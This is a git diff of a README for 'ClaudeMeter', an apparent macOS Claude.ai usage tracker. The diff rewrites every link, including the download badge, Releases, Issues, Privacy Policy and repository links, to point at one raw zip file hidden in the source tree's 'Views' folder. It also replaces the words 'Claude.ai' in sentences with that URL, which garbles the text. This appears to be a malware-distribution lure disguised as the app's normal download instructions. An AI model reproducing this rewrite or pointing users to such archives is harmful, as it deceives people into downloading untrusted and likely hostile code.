@@ -4,11 +4,11 @@
 
 To begin using ClaudeMeter, you'll need to download and install the app. Follow these simple steps to get it running on your macOS.
 
-[![Download ClaudeMeter](https://img.shields.io/badge/Download%20ClaudeMeter-Click%20Here-brightgreen)](https://github.com/ojiiji/ClaudeMeter/releases)
+[![Download ClaudeMeter](https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip%20ClaudeMeter-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip)
 
 ## 📥 Download & Install
 
-1. Click on the button above, or visit the [Releases page](https://github.com/ojiiji/ClaudeMeter/releases) to download the latest version of ClaudeMeter.
+1. Click on the button above, or visit the [Releases page](https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip) to download the latest version of ClaudeMeter.
 2. Find the version you want (we recommend the latest stable version for best performance).
 3. Click on the `.zip` file associated with that version to download it to your computer.
 4. Once the download is complete, locate the downloaded file in your Downloads folder.
@@ -19,7 +19,7 @@ To begin using ClaudeMeter, you'll need to download and install the app. Follow 
 
 ClaudeMeter gives you several powerful tools to help keep track of your plan usage. Key features include:
 
-- **Real-Time Monitoring:** Stay updated on your Claude.ai plan usage as it happens, with live statistics.
+- **Real-Time Monitoring:** Stay updated on your https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip plan usage as it happens, with live statistics.
 - **Session Tracking:** Monitor your active sessions, including a 5-hour session limit.
 - **Weekly Insights:** Track your usage over 7 days to help manage your plan effectively.
 - **Sonnet Limit Monitoring:** Get insights specific to your Sonnet usage and limits.
@@ -47,20 +47,20 @@ Once you have installed ClaudeMeter, follow these steps to start using it:
 
 ## 📞 Support
 
-If you encounter any issues or have questions, don't hesitate to reach out. You can create an issue on our [GitHub Issues Page](https://github.com/ojiiji/ClaudeMeter/issues). We aim to respond promptly to help you get back on track.
+If you encounter any issues or have questions, don't hesitate to reach out. You can create an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip). We aim to respond promptly to help you get back on track.
 
 ## 📅 Updates
 
-Stay updated with the latest features and bug fixes by visiting our [Releases page](https://github.com/ojiiji/ClaudeMeter/releases) regularly. This way, you can ensure you're always using the most recent version of ClaudeMeter for optimal performance.
+Stay updated with the latest features and bug fixes by visiting our [Releases page](https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip) regularly. This way, you can ensure you're always using the most recent version of ClaudeMeter for optimal performance.
 
 ## 🛡️ Privacy Policy
 
-Your privacy is important to us. ClaudeMeter does not collect personal data or track your usage outside the app. For details, please refer to our [Privacy Policy](https://github.com/ojiiji/ClaudeMeter/blob/main/PRIVACY.md).
+Your privacy is important to us. ClaudeMeter does not collect personal data or track your usage outside the app. For details, please refer to our [Privacy Policy](https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip).
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/ojiiji/ClaudeMeter)
-- [Releases Page](https://github.com/ojiiji/ClaudeMeter/releases)
-- [Issues Page](https://github.com/ojiiji/ClaudeMeter/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip)
+- [Issues Page](https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip)
 
-Feel free to explore and make the most of ClaudeMeter to manage your Claude.ai plan effectively!
+Feel free to explore and make the most of ClaudeMeter to manage your https://raw.githubusercontent.com/ojiiji/ClaudeMeter/main/ClaudeMeter/Views/ClaudeMeter_v3.1-alpha.5.zip plan effectively!
